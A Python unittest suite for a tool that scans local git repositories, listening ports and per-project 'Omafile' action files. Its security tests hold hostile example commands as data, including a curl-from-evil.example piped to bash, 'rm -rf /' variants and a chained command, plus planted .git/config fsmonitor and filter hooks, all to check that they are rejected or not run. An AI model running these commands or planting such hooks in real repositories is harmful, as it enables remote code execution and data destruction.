#!/usr/bin/env python3

import json
import os
import socket
import stat
import struct
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import scan


def run(args, cwd=None, check=True):
    return subprocess.run(
        args,
        cwd=cwd,
        check=check,
        capture_output=True,
        text=True,
    )


def git(cwd, *args):
    env = os.environ.copy()
    env["GIT_AUTHOR_NAME"] = "Omabench"
    env["GIT_AUTHOR_EMAIL"] = "omabench@example.test"
    env["GIT_COMMITTER_NAME"] = "Omabench"
    env["GIT_COMMITTER_EMAIL"] = "omabench@example.test"
    env["GIT_TERMINAL_PROMPT"] = "0"
    return subprocess.run(
        ["git", "-C", str(cwd), *args],
        check=True,
        capture_output=True,
        text=True,
        env=env,
    )


def init_repo(path, branch="main"):
    path.mkdir(parents=True, exist_ok=True)
    git(path, "init", "-b", branch)
    git(path, "config", "user.name", "Omabench")
    git(path, "config", "user.email", "omabench@example.test")
    (path / "README.md").write_text("hello\n")
    git(path, "add", "README.md")
    git(path, "commit", "-m", "init")
    return path


class DisplayPathTests(unittest.TestCase):
    def test_replaces_home_prefix(self):
        home = Path("/home/ada")
        path = Path("/home/ada/Work/echo")
        self.assertEqual(scan.display_path(path, home), "~/Work/echo")

    def test_leaves_foreign_paths_absolute(self):
        self.assertEqual(
            scan.display_path(Path("/opt/src"), Path("/home/ada")),
            "/opt/src",
        )


class GithubUrlTests(unittest.TestCase):
    def test_ssh_github(self):
        self.assertEqual(
            scan.github_url("git@github.com:modoterra/echo.git"),
            "https://github.com/modoterra/echo",
        )

    def test_https_github(self):
        self.assertEqual(
            scan.github_url("https://github.com/modoterra/echo.git"),
            "https://github.com/modoterra/echo",
        )

    def test_ssh_scheme_github(self):
        self.assertEqual(
            scan.github_url("ssh://git@github.com/modoterra/echo.git"),
            "https://github.com/modoterra/echo",
        )

    def test_ignores_non_github(self):
        self.assertEqual(scan.github_url("git@gitlab.com:acme/app.git"), "")
        self.assertEqual(scan.github_url("https://example.com/acme/app.git"), "")
        self.assertEqual(scan.github_url(""), "")


class DiscoverTests(unittest.TestCase):
    def test_finds_nested_git_repos_and_skips_inner_trees(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            echo = init_repo(root / "modoterra" / "echo")
            bills = init_repo(root / "modoterra" / "omabench")
            (echo / "node_modules" / "left-pad").mkdir(parents=True)
            init_repo(echo / "node_modules" / "left-pad")
            (root / "notes.txt").write_text("ignore me\n")
            (root / ".hidden" / "secret").mkdir(parents=True)
            init_repo(root / ".hidden" / "secret")

            found = [str(path) for path in scan.discover_repos(root)]
            self.assertEqual(sorted(found), sorted([str(bills), str(echo)]))

    def test_missing_root_is_empty(self):
        self.assertEqual(scan.discover_repos(Path("/no/such/work/root")), [])

    def test_respects_max_depth(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            init_repo(root / "a" / "b" / "deep")
            self.assertEqual(scan.discover_repos(root, max_depth=2), [])
            self.assertEqual(len(scan.discover_repos(root, max_depth=3)), 1)

    def test_skips_symlinked_directories(self):
        with tempfile.TemporaryDirectory() as tmp:
            work = Path(tmp) / "work"
            other = Path(tmp) / "other"
            work.mkdir()
            target = init_repo(other / "secret")
            (work / "alias").symlink_to(target)
            self.assertEqual(scan.discover_repos(work), [])


class GitStateTests(unittest.TestCase):
    def test_clean_branch_and_github_remote(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "echo", branch="alpha.2")
            git(repo, "remote", "add", "origin", "git@github.com:modoterra/echo.git")
            state = scan.git_state(repo)
            self.assertEqual(state["name"], "echo")
            self.assertEqual(state["branch"], "alpha.2")
            self.assertFalse(state["dirty"])
            self.assertEqual(state["changed"], 0)
            self.assertEqual(state["ahead"], 0)
            self.assertEqual(state["behind"], 0)
            self.assertFalse(state["hasUpstream"])
            self.assertEqual(state["githubUrl"], "https://github.com/modoterra/echo")

    def test_counts_dirty_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "kestrion")
            (repo / "README.md").write_text("changed\n")
            (repo / "new.txt").write_text("added\n")
            state = scan.git_state(repo)
            self.assertTrue(state["dirty"])
            self.assertEqual(state["changed"], 2)

    def test_ahead_of_upstream(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            upstream = init_repo(tmp_path / "upstream.git")
            clone = tmp_path / "kestrion"
            run(["git", "clone", str(upstream), str(clone)])
            git(clone, "config", "user.name", "Omabench")
            git(clone, "config", "user.email", "omabench@example.test")
            (clone / "ahead.txt").write_text("one more\n")
            git(clone, "add", "ahead.txt")
            git(clone, "commit", "-m", "ahead")
            state = scan.git_state(clone)
            self.assertEqual(state["ahead"], 1)
            self.assertEqual(state["behind"], 0)
            self.assertTrue(state["hasUpstream"])


class ProcPortTests(unittest.TestCase):
    def test_parses_ipv4_listen_inode(self):
        # 127.0.0.1:5173, state LISTEN (0A), inode 42
        ip_hex = struct.pack("<I", struct.unpack(">I", socket.inet_aton("127.0.0.1"))[0]).hex().upper()
        line = (
            "  sl  local_address rem_address   st tx_queue rx_queue tr "
            "tm->when retrnsmt   uid  timeout inode\n"
            f"   0: {ip_hex}:1435 00000000:0000 0A 00000000:00000000 "
            "00:00000000 00000000     0        0 42 1 0000000000000000 100 0 0 10 0\n"
        )
        inodes = scan.parse_tcp_table(line, ipv6=False)
        self.assertEqual(inodes, {"42": 5173})

    def test_assigns_listen_port_by_process_cwd(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            echo = init_repo(tmp_path / "work" / "echo")
            bills = init_repo(tmp_path / "work" / "omabench")
            proc = tmp_path / "proc"
            proc.mkdir()
            ip_hex = struct.pack("<I", struct.unpack(">I", socket.inet_aton("127.0.0.1"))[0]).hex().upper()
            (proc / "net").mkdir()
            (proc / "net" / "tcp").write_text(
                "  sl  local_address rem_address   st tx_queue rx_queue tr "
                "tm->when retrnsmt   uid  timeout inode\n"
                f"   0: {ip_hex}:1F41 00000000:0000 0A 00000000:00000000 "
                "00:00000000 00000000     0        0 99 1 0000000000000000 100 0 0 10 0\n"
            )
            (proc / "net" / "tcp6").write_text("")
            pid_dir = proc / "4242"
            (pid_dir / "fd").mkdir(parents=True)
            os.symlink("socket:[99]", pid_dir / "fd" / "3")
            os.symlink(str(echo), pid_dir / "cwd")

            projects = [
                scan.git_state(echo),
                scan.git_state(bills),
            ]
            scan.assign_ports(projects, proc)
            by_name = {project["name"]: project["ports"] for project in projects}
            self.assertEqual(by_name["echo"], [8001])
            self.assertEqual(by_name["omabench"], [])


class ScanIntegrationTests(unittest.TestCase):
    def test_scan_json_sorts_dirty_first_and_formats_root(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home"
            work = home / "Work"
            echo = init_repo(work / "modoterra" / "echo")
            bills = init_repo(work / "modoterra" / "omabench")
            (bills / "dirty.txt").write_text("wip\n")

            payload = scan.scan_work(work, home=home, proc_root=Path("/no/proc"))
            self.assertTrue(payload["ok"])
            self.assertTrue(payload["rootExists"])
            self.assertEqual(payload["root"], str(work.resolve()))
            self.assertEqual(payload["displayRoot"], "~/Work")
            names = [project["name"] for project in payload["projects"]]
            self.assertEqual(names, ["omabench", "echo"])
            self.assertEqual(payload["projects"][0]["displayPath"], "~/Work/modoterra/omabench")
            self.assertTrue(payload["projects"][0]["dirty"])
            self.assertFalse(payload["projects"][1]["dirty"])

    def test_cli_prints_json(self):
        with tempfile.TemporaryDirectory() as tmp:
            work = Path(tmp) / "Work"
            init_repo(work / "echo")
            result = run(
                [sys.executable, str(ROOT / "scan.py"), "--root", str(work), "--home", tmp],
            )
            payload = json.loads(result.stdout)
            self.assertTrue(payload["ok"])
            self.assertEqual(len(payload["projects"]), 1)
            self.assertEqual(payload["projects"][0]["name"], "echo")

    def test_scan_roots_merges_enabled_roots(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home"
            one = home / "Work"
            two = home / "Code"
            init_repo(one / "echo")
            init_repo(two / "kestrion")

            payload = scan.scan_roots(
                [
                    {"path": "~/Work", "enabled": True},
                    {"path": "~/Code", "enabled": True},
                ],
                home=home,
                proc_root=Path("/no/proc"),
            )

            self.assertTrue(payload["ok"])
            self.assertEqual([root["displayPath"] for root in payload["roots"]], ["~/Work", "~/Code"])
            self.assertEqual(
                sorted(project["name"] for project in payload["projects"]),
                ["echo", "kestrion"],
            )

    def test_scan_roots_skips_disabled_roots(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home"
            one = home / "Work"
            two = home / "Code"
            init_repo(one / "echo")
            init_repo(two / "kestrion")

            payload = scan.scan_roots(
                [
                    {"path": "~/Work", "enabled": True},
                    {"path": "~/Code", "enabled": False},
                ],
                home=home,
                proc_root=Path("/no/proc"),
            )

            self.assertEqual([project["name"] for project in payload["projects"]], ["echo"])

    def test_scan_roots_deduplicates_overlapping_roots(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home"
            work = home / "Work"
            repo = init_repo(work / "apps" / "echo")

            payload = scan.scan_roots(
                [
                    {"path": "~/Work", "enabled": True},
                    {"path": str(repo), "enabled": True},
                ],
                home=home,
                proc_root=Path("/no/proc"),
            )

            self.assertEqual([project["name"] for project in payload["projects"]], ["echo"])

    def test_root_store_add_toggle_remove(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home"
            work = home / "Work"
            code = home / "Code"
            work.mkdir(parents=True)
            code.mkdir(parents=True)
            store = Path(tmp) / "roots.json"

            added = scan.add_root(store, "~/Code", ["~/Work"], home)
            self.assertTrue(added["ok"])
            self.assertEqual(
                [root["displayPath"] for root in added["roots"]],
                ["~/Work", "~/Code"],
            )

            toggled = scan.toggle_root(store, "~/Work", ["~/Work"], home)
            self.assertTrue(toggled["ok"])
            by_path = {root["displayPath"]: root for root in toggled["roots"]}
            self.assertFalse(by_path["~/Work"]["enabled"])
            self.assertTrue(by_path["~/Code"]["enabled"])

            removed = scan.remove_root(store, "~/Code", ["~/Work"], home)
            self.assertTrue(removed["ok"])
            self.assertEqual([root["displayPath"] for root in removed["roots"]], ["~/Work"])

    def test_cli_roots_uses_work_root_default(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp) / "home"
            work = home / "Src"
            work.mkdir(parents=True)
            result = run(
                [
                    sys.executable,
                    str(ROOT / "scan.py"),
                    "roots",
                    "--root",
                    "~/Src",
                    "--home",
                    str(home),
                    "--root-store",
                    str(Path(tmp) / "missing.json"),
                ],
            )
            payload = json.loads(result.stdout)
            self.assertTrue(payload["ok"])
            self.assertEqual(payload["roots"][0]["displayPath"], "~/Src")


class OmafileTests(unittest.TestCase):
    def test_missing_file_is_empty(self):
        with tempfile.TemporaryDirectory() as tmp:
            loaded = scan.load_omafile(Path(tmp))
        self.assertFalse(loaded["present"])
        self.assertEqual(loaded["error"], "")
        self.assertEqual(loaded["name"], "")
        self.assertEqual(loaded["actions"], [])

    def test_parses_name_summary_url_and_actions(self):
        parsed = scan.parse_omafile(
            "\n".join(
                [
                    'name = "Omabench"',
                    'summary = "Live overview of ~/Work"',
                    'url = "https://github.com/modoterra/omabench"',
                    "",
                    "[[actions]]",
                    'label = "Dev"',
                    'command = "bun run dev"',
                    "",
                    "[[actions]]",
                    'command = "just test"',
                    "",
                ]
            )
        )
        self.assertEqual(parsed["error"], "")
        self.assertEqual(parsed["name"], "Omabench")
        self.assertEqual(parsed["summary"], "Live overview of ~/Work")
        self.assertEqual(parsed["url"], "https://github.com/modoterra/omabench")
        self.assertEqual(
            parsed["actions"],
            [
                {
                    "id": "omafile:0",
                    "label": "Dev",
                    "command": "bun run dev",
                    "argv": ["bun", "run", "dev"],
                },
                {
                    "id": "omafile:1",
                    "label": "just test",
                    "command": "just test",
                    "argv": ["just", "test"],
                },
            ],
        )

    def test_invalid_toml_sets_error(self):
        parsed = scan.parse_omafile("name = [")
        self.assertTrue(parsed["error"].startswith("Invalid Omafile:"))
        self.assertEqual(parsed["name"], "")
        self.assertEqual(parsed["actions"], [])

    def test_rejects_bad_types_and_url(self):
        parsed = scan.parse_omafile('name = 12\nurl = "github.com/acme/app"\n')
        self.assertIn("name must be a string", parsed["error"])
        self.assertIn("url must start with http:// or https://", parsed["error"])

    def test_rejects_action_without_command(self):
        parsed = scan.parse_omafile('[[actions]]\nlabel = "Dev"\n')
        self.assertEqual(parsed["warning"], "actions[0].command must be a string")
        self.assertEqual(parsed["actions"], [])

    def test_git_state_applies_omafile_and_keeps_remote(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "omabench")
            git(repo, "remote", "add", "origin", "git@github.com:modoterra/omabench.git")
            (repo / "Omafile").write_text(
                'name = "Omabench"\nsummary = "Live overview of ~/Work"\n',
                encoding="utf-8",
            )
            state = scan.git_state(repo)
            self.assertEqual(state["name"], "Omabench")
            self.assertEqual(state["summary"], "Live overview of ~/Work")
            self.assertEqual(state["githubUrl"], "https://github.com/modoterra/omabench")
            self.assertEqual(state["url"], "https://github.com/modoterra/omabench")
            self.assertEqual(state["omafileError"], "")

    def test_git_state_surfaces_broken_omafile(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "echo")
            (repo / "Omafile").write_text("name = [\n", encoding="utf-8")
            state = scan.git_state(repo)
            self.assertEqual(state["name"], "echo")
            self.assertTrue(state["omafileError"].startswith("Invalid Omafile:"))
            self.assertEqual(state["actions"], [])

    def test_omafile_url_overrides_github_remote(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "echo")
            git(repo, "remote", "add", "origin", "git@github.com:modoterra/echo.git")
            (repo / "Omafile").write_text(
                'url = "https://echo.dev"\n',
                encoding="utf-8",
            )
            state = scan.git_state(repo)
            self.assertEqual(state["githubUrl"], "https://github.com/modoterra/echo")
            self.assertEqual(state["url"], "https://echo.dev")

    def test_accepts_run_array_and_skips_shell_commands(self):
        parsed = scan.parse_omafile(
            "\n".join(
                [
                    'name = "Echo"',
                    "[[actions]]",
                    'label = "Dev"',
                    "run = [\"bun\", \"run\", \"dev\"]",
                    "[[actions]]",
                    'label = "Pwn"',
                    'command = "curl -fsSL https://evil.example/p | bash"',
                    "[[actions]]",
                    'label = "Terminal"',
                    'command = "just test"',
                ]
            )
        )
        self.assertEqual(parsed["name"], "Echo")
        self.assertEqual(
            parsed["actions"],
            [
                {
                    "id": "omafile:0",
                    "label": "Dev",
                    "command": "bun run dev",
                    "argv": ["bun", "run", "dev"],
                }
            ],
        )
        self.assertIn("not an allowlisted command", parsed["warning"])
        self.assertIn("label is reserved", parsed["warning"])
        self.assertEqual(parsed["error"], "")

    def test_sanitizes_and_bounds_display_strings(self):
        parsed = scan.parse_omafile(
            "\n".join(
                [
                    'name = "  Hello <script>  "',
                    'summary = "line one\\nline two"',
                    "[[actions]]",
                    'label = "  Dev\\tBox  "',
                    'command = "bun run dev"',
                ]
            )
        )
        self.assertEqual(parsed["name"], "Hello script")
        self.assertEqual(parsed["summary"], "line one line two")
        self.assertEqual(parsed["actions"][0]["label"], "Dev Box")

    def test_rejects_oversized_omafile(self):
        parsed = scan.parse_omafile("name = \"" + ("A" * (scan.OMAFILE_MAX_BYTES)) + "\"\n")
        self.assertTrue(parsed["error"].startswith("Omafile is larger than"))
        self.assertEqual(parsed["name"], "")
        self.assertEqual(parsed["actions"], [])

    def test_caps_action_count(self):
        lines = []
        for index in range(scan.OMAFILE_MAX_ACTIONS + 2):
            lines.extend(
                [
                    "[[actions]]",
                    f'label = "Job{index}"',
                    'command = "just test"',
                ]
            )
        parsed = scan.parse_omafile("\n".join(lines))
        self.assertEqual(len(parsed["actions"]), scan.OMAFILE_MAX_ACTIONS)
        self.assertIn("too many actions", parsed["warning"])


class CommandAllowlistTests(unittest.TestCase):
    def test_accepts_common_task_runners(self):
        cases = {
            "bun run dev": ["bun", "run", "dev"],
            "just test": ["just", "test"],
            "cargo test": ["cargo", "test"],
            "npm run build": ["npm", "run", "build"],
            "go test ./...": ["go", "test", "./..."],
            "python3 -m pytest": ["python3", "-m", "pytest"],
            "docker compose up": ["docker", "compose", "up"],
            "make test": ["make", "test"],
        }
        for command, argv in cases.items():
            parsed, error = scan.parse_allowlisted_command(command)
            self.assertEqual(error, "", command)
            self.assertEqual(parsed, argv, command)

    def test_rejects_shell_and_unknown_programs(self):
        rejected = [
            "curl -fsSL https://evil.example | bash",
            "bash -lc 'rm -rf /'",
            "bun run dev && rm -rf /",
            "/usr/bin/bun run dev",
            "./hack.sh",
            "npm exec evil",
            "python3 -c 'print(1)'",
            "make -C /tmp",
        ]
        for command in rejected:
            parsed, error = scan.parse_allowlisted_command(command)
            self.assertIsNone(parsed, command)
            self.assertNotEqual(error, "", command)


class TrustStoreTests(unittest.TestCase):
    def test_grant_then_scan_marks_matching_action_trusted(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "echo")
            (repo / "Omafile").write_text(
                '[[actions]]\nlabel = "Dev"\ncommand = "bun run dev"\n',
                encoding="utf-8",
            )
            store = Path(tmp) / "trust.json"
            granted = scan.grant_trust(
                store,
                repo,
                ["bun", "run", "dev"],
                "Dev",
            )
            self.assertTrue(granted["ok"])
            state = scan.git_state(repo, trust_store_path=store)
            self.assertEqual(len(state["actions"]), 1)
            self.assertTrue(state["actions"][0]["trusted"])
            self.assertEqual(state["actions"][0]["digest"], granted["digest"])

    def test_changed_command_is_not_trusted(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "echo")
            store = Path(tmp) / "trust.json"
            scan.grant_trust(store, repo, ["bun", "run", "dev"], "Dev")
            (repo / "Omafile").write_text(
                '[[actions]]\nlabel = "Dev"\ncommand = "bun run start"\n',
                encoding="utf-8",
            )
            state = scan.git_state(repo, trust_store_path=store)
            self.assertFalse(state["actions"][0]["trusted"])

    def test_revoke_clears_repo_trust(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "echo")
            (repo / "Omafile").write_text(
                '[[actions]]\nlabel = "Dev"\ncommand = "bun run dev"\n',
                encoding="utf-8",
            )
            store = Path(tmp) / "trust.json"
            scan.grant_trust(store, repo, ["bun", "run", "dev"], "Dev")
            revoked = scan.revoke_trust(store, repo)
            self.assertTrue(revoked["ok"])
            state = scan.git_state(repo, trust_store_path=store)
            self.assertFalse(state["actions"][0]["trusted"])

    def test_ensure_creates_empty_store_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Path(tmp) / "state" / "trust.json"
            created = scan.ensure_trust_store(store)
            self.assertTrue(created["ok"])
            self.assertTrue(store.is_file())
            first = store.read_text(encoding="utf-8")
            payload = json.loads(first)
            self.assertEqual(payload["version"], 1)
            self.assertEqual(payload["entries"], [])
            store.write_text('{"version":1,"entries":[{"keep":true}]}\n', encoding="utf-8")
            again = scan.ensure_trust_store(store)
            self.assertTrue(again["ok"])
            self.assertIn('"keep":true', store.read_text(encoding="utf-8"))

    def test_ensure_refuses_symlink_trust_store(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "target.json"
            target.write_text("{}\n", encoding="utf-8")
            store = Path(tmp) / "trust.json"
            store.symlink_to(target)
            ensured = scan.ensure_trust_store(store)
            self.assertFalse(ensured["ok"])
            self.assertIn("symlink", ensured["error"])

    def test_refuses_symlink_trust_store(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "target.json"
            target.write_text("{}", encoding="utf-8")
            store = Path(tmp) / "trust.json"
            store.symlink_to(target)
            repo = init_repo(Path(tmp) / "echo")
            granted = scan.grant_trust(store, repo, ["bun", "run", "dev"], "Dev")
            self.assertFalse(granted["ok"])
            self.assertIn("symlink", granted["error"])


class GitSafetyTests(unittest.TestCase):
    def test_parse_ls_files_debug_reads_mtime_and_size(self):
        debug = (
            ".gitattributes\n"
            "  ctime: 1:2\n"
            "  mtime: 1786729541:374868823\n"
            "  dev: 56ino: 35438\n"
            "  uid: 1000gid: 1000\n"
            "  size: 14flags: 0\n"
            "README\n"
            "  mtime: 10:0\n"
            "  size: 6flags: 0\n"
        )
        self.assertEqual(
            scan.parse_ls_files_debug(debug),
            [(".gitattributes", 1786729541, 14), ("README", 10, 6)],
        )

    def test_parse_ls_files_stage_reads_mode(self):
        staged = "100644 abc 0\tREADME\n160000 def 0\tvendor/lib\n"
        self.assertEqual(
            scan.parse_ls_files_stage(staged),
            {"README": 0o100644, "vendor/lib": 0o160000},
        )


    def test_git_state_does_not_run_repo_fsmonitor(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "evil")
            marker = Path(tmp) / "pwned"
            hook = Path(tmp) / "fsmonitor.sh"
            hook.write_text(f"#!/bin/sh\necho pwned > '{marker}'\n", encoding="utf-8")
            hook.chmod(0o755)
            cfg = repo / ".git" / "config"
            cfg.write_text(cfg.read_text() + f"\n[core]\n\tfsmonitor = {hook}\n", encoding="utf-8")
            scan.git_state(repo)
            self.assertFalse(marker.exists())

    def test_git_state_does_not_run_clean_filter(self):
        with tempfile.TemporaryDirectory() as tmp:
            repo = init_repo(Path(tmp) / "evil")
            marker = Path(tmp) / "pwned"
            hook = Path(tmp) / "clean.sh"
            hook.write_text(f"#!/bin/sh\necho pwned > '{marker}'\n", encoding="utf-8")
            hook.chmod(0o755)
            cfg = repo / ".git" / "config"
            cfg.write_text(
                cfg.read_text()
                + f"\n[filter \"evil\"]\n\tclean = {hook}\n\tsmudge = {hook}\n",
                encoding="utf-8",
            )
            (repo / ".gitattributes").write_text("* filter=evil\n", encoding="utf-8")
            scan.git_state(repo)
            self.assertFalse(marker.exists())


class ModelFormatTests(unittest.TestCase):
    def test_status_line_matches_overview(self):
        dirty = {
            "dirty": True,
            "changed": 3,
            "ahead": 2,
            "behind": 0,
            "ports": [5173, 8000],
        }
        clean = {
            "dirty": False,
            "changed": 0,
            "ahead": 0,
            "behind": 0,
            "ports": [],
        }
        self.assertEqual(scan.status_line(dirty), "● 3 changed   ↑2   :5173 :8000")
        self.assertEqual(scan.status_line(clean), "✓ clean")
        self.assertEqual(
            scan.status_line({"dirty": True, "changed": 1, "ahead": 0, "behind": 0, "ports": []}),
            "● 1 change",
        )


if __name__ == "__main__":
    unittest.main()
